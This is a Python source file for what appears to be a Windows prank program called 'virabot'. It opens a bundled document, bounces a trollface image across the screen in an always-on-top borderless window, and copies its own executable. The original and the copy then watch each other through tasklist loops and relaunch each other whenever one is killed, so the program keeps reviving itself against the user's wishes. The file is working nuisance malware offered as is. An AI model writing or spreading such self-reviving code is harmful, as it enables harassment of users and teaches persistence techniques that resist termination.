from threading import Thread
from subprocess import Popen, run
import tkinter as tk
import os
from shutil import copyfile
from pathlib import Path
import sys
from time import sleep


class Bounce(tk.Toplevel):
    def __init__(self, img, root: tk.Tk):
        super().__init__()
        self.root = root
        self.img = img
        self.x = 100
        self.y = 100
        self.dx = 5
        self.dy = 5
        self.screen_width = root.winfo_screenwidth()
        self.screen_height = root.winfo_screenheight()
        self.window_width = 100
        self.window_height = 100
        self.geometry(f"{self.window_width}x{self.window_height}+{self.x}+{self.y}")
        self.title('')
        self.attributes('-topmost', True)
        self.overrideredirect(True)
        label = tk.Label(self, image=self.img)
        label.pack()

        self.move()

    def move(self):
        self.x += self.dx
        self.y += self.dy
        if self.x <= 0 or self.x + self.window_width >= self.screen_width:
            self.dx = -self.dx
        if self.y <= 0 or self.y + self.window_height >= self.screen_height:
            self.dy = -self.dy
        self.geometry(f"{self.window_width}x{self.window_height}+{self.x}+{self.y}")
        self.root.after(20, self.move)


def runw():
    root = tk.Tk()
    root.withdraw()
    path = os.path.join(os.path.dirname(__file__), 'trollface.png')
    trollface = tk.PhotoImage(file=path)
    win = Bounce(trollface, root)
    root.mainloop()

def copy() -> str:
    file_path = Path("virabotcopy.exe")
    if file_path.exists():
        file_path.unlink()
    current_file = os.path.abspath(sys.executable)
    directory = os.path.dirname(current_file)
    base_name = os.path.basename(current_file)
    file_name, file_extension = os.path.splitext(base_name)
    new_file = f"{file_name}copy{file_extension}"
    new_file_path = os.path.join(directory, new_file)
    copyfile(current_file, new_file_path)
    return new_file_path


def get_resource_path(filename):
    if getattr(sys, 'frozen', False):
        return os.path.join(sys._MEIPASS, filename)
    return os.path.join(os.path.dirname(__file__), filename)


if __name__ == '__main__':
    current_file = os.path.abspath(sys.executable)
    base_name = os.path.basename(current_file)
    file_name, _ = os.path.splitext(base_name)

    if len(sys.argv) > 1:
        while True:
            output = run(['tasklist'], shell=True, capture_output=True).stdout
            c = str(output).find(f'{file_name[:len(file_name) - 4]}.exe')
            if c == -1:
                Popen(f'{file_name[:len(file_name) - 4]}.exe')
    else:
        os.startfile(get_resource_path("CALMDOWN.doc"))
        sleep(5)

        copyaddr = copy()
        t1 = Thread(target=runw)
        t1.start()

        while True:
            output = run(['tasklist'], shell=True, capture_output=True).stdout
            c = str(output).find(f'{file_name}copy.exe')
            if c == -1:
                Popen([copyaddr, f'{file_name}copy'])
